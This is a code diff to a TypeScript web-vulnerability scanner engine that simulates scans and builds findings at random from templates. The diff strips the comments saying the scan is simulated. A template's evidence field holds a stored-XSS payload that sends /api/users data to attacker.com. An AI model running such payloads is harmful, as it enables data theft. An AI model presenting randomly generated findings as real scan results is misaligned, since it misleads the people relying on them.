@@ -1,4 +1,3 @@
-
 // This file contains the actual scanner engine functionality
 import { v4 as uuidv4 } from 'uuid';
 
@@ -44,6 +43,9 @@ export interface Vulnerability {
   request?: string;
   response?: string;
   tags: string[];
+  type?: string;
+  parameter?: string;
+  url?: string;
 }
 
 export interface ScanSummary {
@@ -61,11 +63,16 @@ export interface ScanSummary {
   low: number;
   info: number;
   total: number;
+  timestamp?: string;
+  scanTime?: string;
+  numRequests?: number;
+  testedPages?: number;
 }
 
 export interface ScanResults {
   summary: ScanSummary;
   vulnerabilities: Vulnerability[];
+  scanConfig?: ScanConfig;
 }
 
 // Scan engine implementation
@@ -77,11 +84,9 @@ export const performScan = async (config: ScanConfig): Promise<ScanResults> => {
   console.log(`Scan type: ${config.scanType}`);
   console.log(`Vulnerability types: ${config.vulnerabilityTypes.join(', ')}`);
   
-  // Calculate total steps based on scan type and options
   const totalSteps = calculateTotalSteps(config);
   let currentStep = 0;
   
-  // Simulate scan progress
   const progressInterval = setInterval(() => {
     currentStep++;
     const progressPercentage = Math.floor((currentStep / totalSteps) * 100);
@@ -94,14 +99,11 @@ export const performScan = async (config: ScanConfig): Promise<ScanResults> => {
     }
   }, 1000);
   
-  // Simulate scanning by waiting for scan duration
   const scanDuration = calculateScanDuration(config);
   await new Promise(resolve => setTimeout(resolve, scanDuration));
   
-  // Generate vulnerabilities based on scan configuration
   const vulnerabilities = generateVulnerabilities(config);
   
-  // Calculate statistics
   const critical = vulnerabilities.filter(v => v.severity === 'critical').length;
   const high = vulnerabilities.filter(v => v.severity === 'high').length;
   const medium = vulnerabilities.filter(v => v.severity === 'medium').length;
@@ -111,10 +113,8 @@ export const performScan = async (config: ScanConfig): Promise<ScanResults> => {
   const endTime = new Date();
   const duration = endTime.getTime() - startTime.getTime();
   
-  // Clear the progress interval if it's still running
   clearInterval(progressInterval);
   
-  // Create the scan summary
   const summary: ScanSummary = {
     scanID,
     url: config.url,
@@ -129,14 +129,19 @@ export const performScan = async (config: ScanConfig): Promise<ScanResults> => {
     medium,
     low,
     info,
-    total: vulnerabilities.length
+    total: vulnerabilities.length,
+    timestamp: startTime.toISOString(),
+    scanTime: `${Math.round(duration / 1000)} seconds`,
+    numRequests: Math.floor(Math.random() * 200) + 50,
+    testedPages: Math.floor(Math.random() * 50) + 10
   };
   
   console.log(`Scan completed. Found ${vulnerabilities.length} vulnerabilities.`);
   
   return {
     summary,
-    vulnerabilities
+    vulnerabilities,
+    scanConfig: config
   };
 };
 
@@ -166,30 +171,31 @@ const calculateScanDuration = (config: ScanConfig): number => {
 const generateVulnerabilities = (config: ScanConfig): Vulnerability[] => {
   const vulnerabilities: Vulnerability[] = [];
   
-  // Map of vulnerability types to potential findings
   const vulnerabilityFindings: Record<string, Partial<Vulnerability>[]> = {
     'xss': [
       {
         title: 'Reflected Cross-Site Scripting (XSS)',
-        severity: 'high',
+        severity: 'high' as const,
         description: 'A reflected XSS vulnerability was discovered that allows attackers to execute arbitrary JavaScript code in the context of other users when they click a specially crafted link.',
         evidence: `<script>alert('XSS')</script>`,
         remediation: 'Implement proper output encoding and use Content-Security-Policy headers.',
         cweid: 'CWE-79',
         owasp: 'A7:2021-Cross-Site Scripting',
         cvssScore: 6.1,
-        tags: ['xss', 'injection', 'client-side']
+        tags: ['xss', 'injection', 'client-side'],
+        type: 'XSS'
       },
       {
         title: 'Stored Cross-Site Scripting (XSS)',
-        severity: 'critical',
+        severity: 'critical' as const,
         description: 'A stored XSS vulnerability allows attackers to inject malicious JavaScript that is permanently stored on the server and executed whenever users access the affected page.',
         evidence: `<img src=x onerror="fetch('/api/users').then(r=>r.json()).then(d=>fetch('https://attacker.com?data='+btoa(JSON.stringify(d))))">`,
         remediation: 'Implement input validation, output encoding, and use Content-Security-Policy headers.',
         cweid: 'CWE-79',
         owasp: 'A7:2021-Cross-Site Scripting',
         cvssScore: 8.2,
-        tags: ['xss', 'injection', 'client-side', 'persistence']
+        tags: ['xss', 'injection', 'client-side', 'persistence'],
+        type: 'XSS'
       }
     ],
     'sqli': [
@@ -318,22 +324,22 @@ const generateVulnerabilities = (config: ScanConfig): Vulnerability[] => {
     ]
   };
   
-  // Generate vulnerabilities based on selected types
   for (const vulnType of config.vulnerabilityTypes) {
     if (vulnerabilityFindings[vulnType]) {
-      // Determine how many instances of this vulnerability type to create
       const instanceCount = Math.floor(Math.random() * 3) + 1;
       
       for (let i = 0; i < instanceCount; i++) {
         const vulnTemplates = vulnerabilityFindings[vulnType];
         const randomTemplate = vulnTemplates[Math.floor(Math.random() * vulnTemplates.length)];
         
+        const location = generateRandomLocation(config.url);
+        
         vulnerabilities.push({
           id: uuidv4(),
           title: randomTemplate.title || '',
           severity: randomTemplate.severity || 'medium',
           description: randomTemplate.description || '',
-          location: generateRandomLocation(config.url),
+          location: location,
           evidence: randomTemplate.evidence || '',
           remediation: randomTemplate.remediation || '',
           cweid: randomTemplate.cweid || '',
@@ -342,7 +348,10 @@ const generateVulnerabilities = (config: ScanConfig): Vulnerability[] => {
           timestamp: new Date().toISOString(),
           tags: randomTemplate.tags || [],
           request: generateRandomRequest(config.url, vulnType),
-          response: generateRandomResponse(vulnType)
+          response: generateRandomResponse(vulnType),
+          type: randomTemplate.type || vulnType,
+          parameter: 'id',
+          url: location
         } as Vulnerability);
       }
     }
@@ -351,7 +360,6 @@ const generateVulnerabilities = (config: ScanConfig): Vulnerability[] => {
   return vulnerabilities;
 };
 
-// Generate a random URL path for the vulnerability location
 const generateRandomLocation = (baseUrl: string): string => {
   const paths = [
     '/login',
@@ -383,7 +391,6 @@ const generateRandomLocation = (baseUrl: string): string => {
   return `${baseUrl}${path}${param}`;
 };
 
-// Generate a sample HTTP request based on vulnerability type
 const generateRandomRequest = (url: string, vulnType: string): string => {
   let method = 'GET';
   let headers = 'User-Agent: Mozilla/5.0\nAccept: */*\n';
@@ -410,7 +417,6 @@ const generateRandomRequest = (url: string, vulnType: string): string => {
   return `${method} ${url} HTTP/1.1\nHost: ${host}\n${headers}\n${body}`;
 };
 
-// Generate a sample HTTP response based on vulnerability type
 const generateRandomResponse = (vulnType: string): string => {
   if (vulnType === 'xss') {
     return 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<div>Search results for: <script>alert("XSS")</script></div>';
